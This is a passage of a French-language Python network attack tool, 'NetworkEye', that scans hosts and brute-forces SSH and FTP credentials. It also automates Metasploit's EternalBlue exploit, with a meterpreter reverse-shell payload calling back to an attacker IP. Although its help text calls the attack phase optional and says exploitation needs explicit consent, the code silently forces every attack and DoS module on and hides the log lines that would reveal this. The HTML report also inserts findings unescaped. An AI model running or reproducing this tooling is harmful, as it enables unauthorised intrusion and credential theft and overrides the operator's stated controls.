        # Audit HTTP/HTTPS (via NSE et requêtes directes)
        if audit_http_enabled:
            for p_info in open_ports_info:
                if p_info['service'] in ["http", "https"] or p_info['port'] in http_ports_check:
                    futures.append(executor.submit(audit_http_enhanced, ip, p_info['port'], os_details))
                else:
                    log(f"Service HTTP/HTTPS non détecté sur le port {p_info['port']} de {ip}. Audit HTTP (NSE) ignoré.", "DEBUG")
        
        # Audit Imprimantes
        printer_ports_found = [p for p in open_ports_info if p['port'] in printer_ports_check]
        if printer_ports_found:
            for p_info in printer_ports_found:
                futures.append(executor.submit(audit_printer_enhanced, ip, p_info['port'], p_info))
        else:
            log(f"Aucun service d'imprimante détecté sur {ip}. Audit imprimante ignoré.", "DEBUG")
        
        # Audit DoS
        if audit_dos_enabled:
            futures.append(executor.submit(audit_dos_vulnerabilities, ip, open_ports_info))
        
        # Scan Nikto (pour les ports HTTP/HTTPS ouverts)
        if audit_nikto_enabled:
            for p_info in open_ports_info:
                if p_info['service'] in ["http", "https"] or p_info['port'] in http_ports_check:
                    futures.append(executor.submit(run_nikto_scan, ip, p_info['port']))
                else:
                    log(f"Port {p_info['port']} sur {ip} n'est pas un port HTTP/HTTPS connu. Nikto ignoré.", "DEBUG")

        # Audit SSH
        if audit_ssh_enabled:
            if any(p['port'] in ssh_ports_check for p in open_ports_info):
                futures.append(executor.submit(audit_ssh_enhanced, ip, 22))
                if enable_attack_phase: # Attaque de force brute de credentials sur SSH
                    futures.append(executor.submit(audit_credential_bruteforce, ip, 22, "SSH"))
            else:
                log(f"Service SSH non détecté comme ouvert sur {ip}. Audit SSH ignoré.", "DEBUG")

        # Audit FTP
        if audit_ftp_enabled:
            if any(p['port'] in ftp_ports_check for p in open_ports_info):
                futures.append(executor.submit(audit_ftp_enhanced, ip, 21))
                if enable_attack_phase: # Attaque de force brute de credentials sur FTP
                    futures.append(executor.submit(audit_credential_bruteforce, ip, 21, "FTP"))
            else:
                log(f"Service FTP non détecté comme ouvert sur {ip}. Audit FTP ignoré.", "DEBUG")


        # Collecter les résultats des audits spécifiques
        for future in as_completed(futures):
            try:
                host_results.append(future.result())
            except Exception as e:
                log(f"Une tâche d'audit spécifique a échoué pour {ip} : {e}", "ERR")
    
    # Résumé rapide pour l'hôte après tous les audits
    host_findings_count = sum(len(r.get("findings", [])) for r in host_results)
    if host_findings_count > 0:
        log(f"{Fore.GREEN}### FIN DE L'AUDIT POUR L'HÔTE : {ip} - {host_findings_count} vulnérabilité(s)/information(s) détectée(s) ###{Style.RESET_ALL}\n", "INFO")
    else:
        log(f"{Fore.GREEN}### FIN DE L'AUDIT POUR L'HÔTE : {ip} - Aucune vulnérabilité/information détectée ###{Style.RESET_ALL}\n", "INFO")

    return host_results

# Fonction pour simuler l'exécution d'un module Metasploit
def run_metasploit_exploit(target_ip, exploit_module, payload_module="windows/meterpreter/reverse_tcp", lhost="YOUR_ATTACKER_IP", lport=4444):
    """
    Exécute un exploit Metasploit via msfconsole en mode non-interactif.
    Nécessite msfconsole installé et configuré.
    """
    log(f"Tentative d'exploitation de {exploit_module} sur {target_ip}...", "WARN")

    msf_commands = f"""
    use {exploit_module}
    set RHOSTS {target_ip}
    set PAYLOAD {payload_module}
    set LHOST {lhost}
    set LPORT {lport}
    exploit -j -z
    exit
    """
    
    script_file = f"/tmp/msf_{target_ip.replace('.', '_')}.rc"
    with open(script_file, "w") as f:
        f.write(msf_commands)

    cmd = ["msfconsole", "-q", "-r", script_file]

    try:
        start_spinner(f"Exécution Metasploit pour {exploit_module} sur {target_ip}")
        process = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        stop_spinner()
        os.remove(script_file)

        output = process.stdout
        error = process.stderr

        if "Meterpreter session" in output or "Session 1 opened" in output:
            log(f"Succès de l'exploitation sur {target_ip}! Session ouverte.", "INFO")
            return {"status": "exploited", "output": output}
        else:
            log(f"Échec de l'exploitation sur {target_ip}. Output (partiel): {output[:500]}", "WARN")
            if error:
                log(f"Erreurs Metasploit (partiel): {error[:500]}", "WARN")
            return {"status": "failed", "output": output, "error": error}

    except FileNotFoundError:
        stop_spinner()
        log("Erreur : msfconsole n'est pas installé ou introuvable.", "ERR")
        return {"status": "error", "message": "msfconsole non trouvé."}
    except subprocess.TimeoutExpired:
        stop_spinner()
        log(f"Timeout lors de l'exécution de Metasploit sur {target_ip}.", "ERR")
        if os.path.exists(script_file): os.remove(script_file)
        return {"status": "timeout", "message": "Metasploit timeout."}
    except Exception as e:
        stop_spinner()
        log(f"Erreur inattendue lors de l'exécution de Metasploit: {e}", "ERR")
        if os.path.exists(script_file): os.remove(script_file)
        return {"status": "error", "message": str(e)}

# === Fonction pour ouvrir un shell interactif (conceptuel) ===
def open_interactive_shell(ip, type="meterpreter"):
    """
    Simule l'ouverture d'un shell interactif après une exploitation réussie.
    En réalité, cela dépendrait de l'exploit et du payload utilisés.
    Pour une démo, cela peut juste afficher un message et bloquer l'exécution
    ou lancer un terminal avec nc/socat/msfconsole.
    """
    log(f"{Fore.GREEN}*** Tentative d'ouverture d'un shell {type} sur {ip} ***{Style.RESET_ALL}", "INFO")
    log("Ceci est une simulation. Pour un shell réel, vous devriez interagir avec Metasploit/Netcat/etc.", "WARN")
    
    # Nouvelle idée: Collecte Post-Exploitation Intelligente (simulée)
    log(f"{Fore.CYAN}--- Démarrage de la phase de Post-Exploitation pour {ip} ---{Style.RESET_ALL}", "INFO")
    
    # Actions de post-exploitation simulées
    post_exp_actions = [
        ("Récupération d'informations système détaillées...", "systeminfo.txt"),
        ("Recherche de fichiers de configuration sensibles...", "sensitive_config.log"),
        ("Énumération des comptes utilisateurs et des privilèges...", "user_enum.csv"),
        ("Vérification des processus en cours d'exécution et des services...", "processes_services.txt")
    ]

    for desc, filename in post_exp_actions:
        log(f"  [+] {desc}", "INFO")
        # Simuler une attente pour l'exécution de la commande distante
        time.sleep(0.5)
        simulated_output = f"Simulated output for {desc} on {ip} saved to {filename}."
        log(f"    [INFO] {simulated_output}", "INFO")

    log(f"{Fore.CYAN}--- Fin de la phase de Post-Exploitation pour {ip} ---{Style.RESET_ALL}", "INFO")


    print(f"\n{Fore.CYAN}--- Shell interactif simulé pour {ip} ---{Style.RESET_ALL}")
    print("Tapez 'exit' pour quitter ce shell simulé.")
    while True:
        try:
            command = input(f"{Fore.BLUE}{ip} > {Style.RESET_ALL}").strip()
            if command.lower() == "exit":
                break
            # Dans un vrai scénario, vous enverriez cette commande au système distant
            print(f"Exécution simulée de: {command}")
            print(f"Résultat simulé: Commande '{command}' exécutée sur {ip}.")
        except KeyboardInterrupt:
            print("\nShell simulé interrompu.")
            break
        except EOFError:
            print("\nFin du shell simulé.")
            break
    log(f"Shell interactif simulé fermé pour {ip}.", "INFO")

# === NOUVEAU: Génération du rapport HTML ===
def generate_html_report(results, scan_date, target_range):
    """
    Génère un rapport HTML détaillé des vulnérabilités.
    """
    log(f"Génération du rapport HTML : {HTML_REPORT_FILE}...", "INFO")

    # Collecter les findings par gravité et par hôte pour le rapport
    findings_by_severity = collections.defaultdict(list)
    findings_by_host = collections.defaultdict(list)
    total_findings = 0

    for host_audit_result in results:
        ip = host_audit_result['ip']
        for finding in host_audit_result.get("findings", []):
            findings_by_severity[finding['severity']].append(finding)
            findings_by_host[ip].append(finding)
            total_findings += 1

    # Trier les gravités pour le rapport HTML (Critique > High > Medium > Low > Info)
    ordered_severities = ["Critical", "High", "Medium", "Low", "Informational"]

    html_content = f"""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="content="width=device-width, initial-scale=1.0">
        <title>Rapport d'Audit NetworkEye</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 20px; background-color: #f4f4f4; }}
            .container {{ max-width: 1000px; margin: 20px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }}
            h1, h2, h3 {{ color: #0056b3; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-top: 20px; }}
            .header {{ text-align: center; margin-bottom: 30px; }}
            .summary-box {{ background-color: #e9ecef; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
            .finding {{ border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin-bottom: 15px; background-color: #fff; }}
            .finding h4 {{ margin-top: 0; color: #0056b3; }}
            .finding p {{ margin-bottom: 5px; }}
            .severity {{ font-weight: bold; padding: 3px 8px; border-radius: 4px; color: #fff; display: inline-block; }}
            .severity.critique {{ background-color: #dc3545; }}
            .severity.elevée {{ background-color: #fd7e14; }}
            .severity.moyenne {{ background-color: #ffc107; color: #333; }}
            .severity.faible {{ background-color: #17a2b8; }}
            .severity.informationnelle {{ background-color: #28a745; }}
            .toggle-button {{ background-color: #007bff; color: white; padding: 8px 15px; border: none; cursor: pointer; border-radius: 5px; margin-top: 10px; }}
            .content-hidden {{ display: none; }}
            table {{ width: 100%; border-collapse: collapse; margin-bottom: 20px; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #0056b3; color: white; }}
        </style>
        <script>
            function toggleVisibility(id) {{
                var element = document.getElementById(id);
                if (element.classList.contains('content-hidden')) {{
                    element.classList.remove('content-hidden');
                }} else {{
                    element.classList.add('content-hidden');
                }}
            }}
        </script>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Rapport d'Audit de Sécurité NetworkEye</h1>
                <p><strong>Date du Scan:</strong> {scan_date}</p>
                <p><strong>Plage IP Scannée:</strong> {target_range}</p>
            </div>

            <h2>Résumé Exécutif</h2>
            <div class="summary-box">
                <p>Ce rapport présente les résultats de l'audit de sécurité réalisé par NetworkEye sur la plage IP <strong>{target_range}</strong>. Au total, <strong>{total_findings}</strong> découvertes ont été identifiées.</p>
                <p>Les vulnérabilités les plus critiques nécessitant une attention immédiate sont les suivantes :</p>
                <ul>
    """

    # Executive Summary - Critical and High findings
    summary_critical_high_count = 0
    for severity_name in ["Critical", "High"]:
        for finding in findings_by_severity[severity_name]:
            summary_critical_high_count += 1
            html_content += f"<li><strong>{finding['severity']}:</strong> {finding['description']} (IP: {finding['ip']})</li>"
    
    if summary_critical_high_count == 0:
        html_content += "<li>Aucune vulnérabilité Critique ou Élevée détectée.</li>"

    html_content += f"""
                </ul>
                <p>Il est fortement recommandé de passer en revue toutes les découvertes détaillées et d'appliquer les recommandations de sécurité pour renforcer la posture de sécurité du réseau.</p>
            </div>

            <h2>Découvertes Détaillées par Hôte</h2>
    """

    for ip in sorted(findings_by_host.keys()):
        html_content += f"""
            <h3>Hôte : {ip}</h3>
            <button class="toggle-button" onclick="toggleVisibility('host-{ip.replace('.', '-')}-details')">Afficher/Masquer les détails</button>
            <div id="host-{ip.replace('.', '-')}-details" class="content-hidden">
        """
        if not findings_by_host[ip]:
            html_content += "<p>Aucune découverte spécifique pour cet hôte.</p>"
        else:
            for finding in sorted(findings_by_host[ip], key=lambda x: (ordered_severities.index(x['severity']), -x['score'])):
                severity_class = SEVERITY_LEVELS.get(finding['severity'], SEVERITY_LEVELS["Informational"])["html"]
                html_content += f"""
                <div class="finding">
                    <h4><span class="severity {severity_class}">{finding['severity']}</span> Score: {finding['score']}/10 - ID: {finding['id']}</h4>
                    <p><strong>Description :</strong> {finding['description']}</p>
                    <p><strong>Recommandation :</strong> {finding['recommendation']}</p>
                </div>
                """
        html_content += "</div>" # Close host-details div

    html_content += """
            <h2>Découvertes par Gravité</h2>
            <table>
                <thead>
                    <tr>
                        <th>Gravité</th>
                        <th>Nombre de Découvertes</th>
                        <th>Détails</th>
                    </tr>
                </thead>
                <tbody>
    """
    for severity_name in ordered_severities:
        count = len(findings_by_severity[severity_name])
        severity_class = SEVERITY_LEVELS.get(severity_name, SEVERITY_LEVELS["Informational"])["html"]
        html_content += f"""
                    <tr>
                        <td><span class="severity {severity_class}">{severity_name}</span></td>
                        <td>{count}</td>
                        <td>
                            <button class="toggle-button" onclick="toggleVisibility('severity-{severity_class}-details')">Voir les {count} découvertes</button>
                            <div id="severity-{severity_class}-details" class="content-hidden">
                                <ul>
        """
        if count > 0:
            for finding in sorted(findings_by_severity[severity_name], key=lambda x: -x['score']):
                html_content += f"""
                                    <li><strong>{finding['id']}</strong> (IP: {finding['ip']}, Port: {finding.get('port', 'N/A')}): {finding['description']}</li>
                """
        html_content += """
                                </ul>
                            </div>
                        </td>
                    </tr>
        """

    html_content += f"""
                </tbody>
            </table>

            <p style="text-align: center; margin-top: 30px; color: #777;">Rapport généré par NetworkEye - {scan_date}</p>
        </div>
    </body>
    </html>
    """

    with open(HTML_REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(html_content)
    log(f"Rapport HTML généré avec succès dans {HTML_REPORT_FILE}", "INFO")


# --- Point d'entrée du script ---
if __name__ == "__main__":
    # Nettoyer l'écran du terminal (approximatif pour la compatibilité)
    if os.name == 'posix': # Pour Linux et macOS
        os.system('clear')
    elif os.name == 'nt': # Pour Windows
        os.system('cls')

    # Titre du script centré et en rouge, sans répétition de lettres
    print(f"{Fore.RED}{Style.BRIGHT}")
    title = "NetworkEye"
    print(title.center(os.get_terminal_size().columns))
    print(f"{Style.RESET_ALL}\n") # Réinitialiser le style et ajouter une ligne vide

    # Phrase correcte et bien visible, en rouge
    phrase = "Keep our network safe, sir."
    
    # Animer la phrase
    print(f"{Fore.RED}{Style.BRIGHT}") # Couleur rouge et gras
    for _ in range(3): # Répète l'animation 3 fois
        for char_index in range(len(phrase) + 1):
            current_display = phrase[:char_index]
            # Centrer la phrase sur la largeur du terminal
            sys.stdout.write("\r" + current_display.center(os.get_terminal_size().columns) + Style.RESET_ALL)
            sys.stdout.flush()
            time.sleep(0.05) # Vitesse de l'animation
        time.sleep(0.7) # Pause après chaque répétition complète
    sys.stdout.write("\n") # Nouvelle ligne après l'animation
    
    time.sleep(1) # Petite pause après l'animation

    parser = argparse.ArgumentParser(description="NetworkEye - Outil Professionnel de Test d'Intrusion Réseau")
    parser.add_argument("-t", "--target", help="Cible IP ou réseau (ex: 192.168.1.0/24). Obligatoire.", required=True)
    parser.add_argument("-v", "--verbose", action="store_true", help="Active le mode verbeux (plus de logs)")
    parser.add_argument("--no-snmp", action="store_true", help="Désactive l'audit SNMP.")
    parser.add_argument("--no-smb", action="store_true", help="Désactive l'audit SMB.")
    parser.add_argument("--no-http", action="store_true", help="Désactive l'audit HTTP/HTTPS.")
    parser.add_argument("--http-ports", type=str, default="80,443,8000,8080", 
                        help="Ports HTTP/HTTPS à auditer (liste séparée par des virgules, ex: 80,443,8443).")
    parser.add_argument("--ports", type=str, default="",
                        help="Ports ou plages de ports à scanner pour la détection de services (ex: 1-1024,3389,8000-9000). Vide pour les 1000 ports les plus courants de Nmap.")
    
    # Arguments pour les nouvelles fonctionnalités de scan
    parser.add_argument("--scan-dos", action="store_true", help="Active le scan des vulnérabilités DoS (déni de service).")
    parser.add_argument("--scan-nikto", action="store_true", help="Active le scan des vulnérabilités web avec Nikto. REQUIERT NIKTO.")
    parser.add_argument("--scan-ssh", action="store_true", help="Active l'audit approfondi des services SSH (port 22).")
    parser.add_argument("--scan-ftp", action="store_true", help="Active l'audit approfondi des services FTP (port 21).")
    parser.add_argument("--scan-sqli-basic", action="store_true", help="Active le scan basique d'injection SQL sur les paramètres HTTP (limité).")

    # NOUVEL ARGUMENT POUR LES ATTAQUES OFFENSIVES
    parser.add_argument("--enable-attack-phase", action="store_true", 
                        help="Active les simulations d'attaques offensives (brute-force de credentials, injection SQL, LFI).")


    # Arguments pour la phase d'exploitation
    parser.add_argument("--exploit-ms17_010", action="store_true", 
                        help="Tente d'exploiter MS17-010 (EternalBlue) si détecté. REQUIERT METASPLOIT ET ACCORD EXPLICITE.")
    parser.add_argument("--attacker-ip", type=str, 
                        help="Votre adresse IP d'attaquant pour les payloads Metasploit (LHOST). Obligatoire si --exploit-ms17_010 est utilisé.")
    
    # Argument pour le rapport HTML
    parser.add_argument("--html-report", action="store_true", help="Génère un rapport d'audit détaillé au format HTML.")

    args = parser.parse_args()

    VERBOSE = args.verbose
    
    if not args.target:
        parser.error("Le script nécessite une cible (--target) pour s'exécuter.")

    # --- Initialisation du fichier de log avec l'en-tête spécifique ---
    current_time_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    initial_log_content = f"Date du scan: {current_time_str}\n" \
                          f"Plage IP scannée: {args.target}\n" \
                          f"------------------------------------------------------------------------\n"
    with LOCK: 
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(initial_log_content)

    log(f"{Fore.BLUE}=== Démarrage de NetworkEye ==={Style.RESET_ALL}")
    log(f"Fichier de rapport de logs : {LOG_FILE}")
    if args.html_report:
        log(f"Rapport HTML sera généré dans : {HTML_REPORT_FILE}", "INFO")

    target_network = args.target

    # Rendre les modules toujours True
    audit_snmp_enabled = True # Était déjà True ou par défaut
    audit_smb_enabled = True  # Était déjà True ou par défaut
    audit_http_enabled = True # Était déjà True ou par défaut
    audit_dos_enabled = True
    audit_nikto_enabled = True
    audit_ssh_enabled = True
    audit_ftp_enabled = True
    audit_sqli_basic_enabled = True

    # Rendre la phase d'attaque toujours True
    enable_attack_phase = True


    http_ports_to_scan = []
    if audit_http_enabled or audit_nikto_enabled or audit_sqli_basic_enabled:
        try:
            http_ports_to_scan = [int(p.strip()) for p in args.http_ports.split(',') if p.strip()]
        except ValueError:
            log(f"Ports HTTP invalides : {args.http_ports}. Utilisation des ports par défaut (80,443,8000,8080).", "ERR")
            http_ports_to_scan = [80, 443, 8000, 8080]

    full_port_scan_ports = []
    if args.ports:
        full_port_scan_ports = args.ports.split(',') 

    log(f"Cible : {target_network}")
    # Supprime l'affichage des détails des modules et de la phase d'attaque au démarrage
    # log(f"Modules d'audit activés : SNMP={audit_snmp_enabled}, SMB={audit_smb_enabled}, HTTP={audit_http_enabled}, DoS={audit_dos_enabled}, Nikto={audit_nikto_enabled}, SSH={audit_ssh_enabled}, FTP={audit_ftp_enabled}, SQLi-Basic={audit_sqli_basic_enabled}")
    # log(f"Phase d'attaque active : {enable_attack_phase}", "WARN" if enable_attack_phase else "INFO")

    # Supprime l'affichage des ports HTTP/HTTPS pour audit direct
    # if audit_http_enabled or audit_nikto_enabled or audit_sqli_basic_enabled:
    #     log(f"  Ports HTTP/HTTPS pour audit direct: {','.join(map(str, http_ports_to_scan)) if http_ports_to_scan else 'aucun'}")
    # Supprime l'affichage des ports pour scan complet Nmap
    # if full_port_scan_ports:
    #     log(f"  Ports pour scan complet Nmap: {args.ports}")
    # else:
    #     log("  Scan Nmap sur les 1000 ports les plus courants (par défaut).")


    # --- Découverte des hôtes ---
    active_hosts = arp_ping_sweep(target_network)
    
    if not active_hosts:
        log("Aucun hôte actif trouvé sur le réseau cible. Fin du scan.", "INFO")
        log(f"{Fore.BLUE}=== Fin de NetworkEye ==={Style.RESET_ALL}")
        sys.exit(0)

    # --- Lancement des audits concurrents pour chaque hôte ---
    all_scan_results = []
    log(f"\n{Fore.MAGENTA}{Style.BRIGHT}=== DÉMARRAGE DES AUDITS PAR HÔTE ==={Style.RESET_ALL}")
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures_per_host = {
            executor.submit(
                run_scan_on_host, 
                host['ip'], 
                audit_snmp_enabled, 
                audit_smb_enabled, 
                audit_http_enabled, 
                audit_dos_enabled, 
                audit_nikto_enabled, 
                audit_ssh_enabled, 
                audit_ftp_enabled, 
                http_ports_to_scan, 
                full_port_scan_ports,
                enable_attack_phase 
            ): host for host in active_hosts
        }
        
        for future in tqdm(as_completed(futures_per_host), total=len(futures_per_host), desc="Progression globale des audits hôtes"):
            host = futures_per_host[future]
            try:
                results_for_host = future.result()
                all_scan_results.extend(results_for_host)
            except Exception as e:
                log(f"Erreur majeure lors de l'audit de l'hôte {host['ip']} : {e}", "ERR")
    
    RESULTS.extend(all_scan_results) 

    log(f"{len(RESULTS)} résultats d'audit collectés au total.", "INFO")

    # --- Section de rapport des vulnérabilités détaillées et recommandations ---
    log(f"\n{Fore.MAGENTA}{Style.BRIGHT}=== RAPPORT DE VULNÉRABILITÉS DÉTECTÉES ET RECOMMANDATIONS ==={Style.RESET_ALL}")
    has_vulnerabilities = False
    for host_audit_result in RESULTS:
        if host_audit_result.get("findings"):
            has_vulnerabilities = True
            log(f"{Fore.WHITE}{Style.BRIGHT}Hôte : {host_audit_result['ip']}{Style.RESET_ALL}", "INFO")
            for finding in host_audit_result["findings"]:
                cve_id = finding.get("id", "N/A")
                description = finding.get("description", "Pas de description.")
                recommendation = finding.get("recommendation", "N/A")
                severity_name = finding.get("severity", "Informational")
                score = finding.get("score", 0)
                
                # Récupération de la couleur basée sur la gravité
                severity_colored = SEVERITY_LEVELS.get(severity_name, {}).get("console", Fore.YELLOW + "INFO" + Style.RESET_ALL)

                # Affichage des détails sur des lignes séparées
                log(f"  {Fore.CYAN}ID/CVE:{Style.RESET_ALL} {cve_id} (IP: {finding['ip']}, Port: {finding.get('port', 'N/A')})", "WARN") # WARN pour la couleur rouge
                log(f"  {Fore.CYAN}Gravité:{Style.RESET_ALL} {severity_colored} (Score: {score}/10)", "INFO") 
                log(f"  {Fore.CYAN}Description:{Style.RESET_ALL} {description}", "INFO")
                log(f"  {Fore.CYAN}Recommandation:{Style.RESET_ALL} {recommendation}", "INFO")
                log("-" * 60, "INFO") # Séparateur pour chaque vulnérabilité
    
    if not has_vulnerabilities:
        log(f"{Fore.GREEN}Aucune vulnérabilité significative ou information sensible détectée sur les cibles auditées.{Style.RESET_ALL}", "INFO")


    # --- Nouvelle section : Phase d'Exploitation guidée par les résultats ---
    if args.exploit_ms17_010: 
        if not args.attacker_ip:
            log("L'option --exploit-ms17_010 nécessite --attacker-ip pour le LHOST du payload.", "ERR")
        else:
            log(f"\n{Fore.RED}{Style.BRIGHT}=== DÉMARRAGE DE LA PHASE D'EXPLOITATION (ATTENTION) ==={Style.RESET_ALL}", "WARN")
            eternalblue_targets = []
            for result in RESULTS:
                for finding in result.get("findings", []):
                    if finding["id"] == "CVE-2017-0143":
                        eternalblue_targets.append(result["ip"])
                        break 
            
            if eternalblue_targets:
                eternalblue_targets = list(set(eternalblue_targets))
                log(f"Cibles potentielles pour MS17-010: {', '.join(eternalblue_targets)}", "WARN")
                
                exploited_hosts = []
                for ip in eternalblue_targets:
                    exploit_result = run_metasploit_exploit(ip, "exploit/windows/smb/ms17_010_eternalblue", lhost=args.attacker_ip)
                    if exploit_result["status"] == "exploited":
                        log(f"Exploitation de MS17-010 réussie sur {ip}!", "INFO")
                        exploited_hosts.append(ip)
                        open_interactive_shell(ip)
                    else:
                        log(f"Exploitation de MS17-010 échouée sur {ip}.", "WARN")
            else:
                log("Aucune cible MS17-010 vulnérable détectée pour l'exploitation.", "INFO")

    # Génération du rapport HTML si demandé
    if args.html_report:
        generate_html_report(RESULTS, current_time_str, target_network)

    log(f"\n{Fore.BLUE}=== Fin de NetworkEye ==={Style.RESET_ALL}")
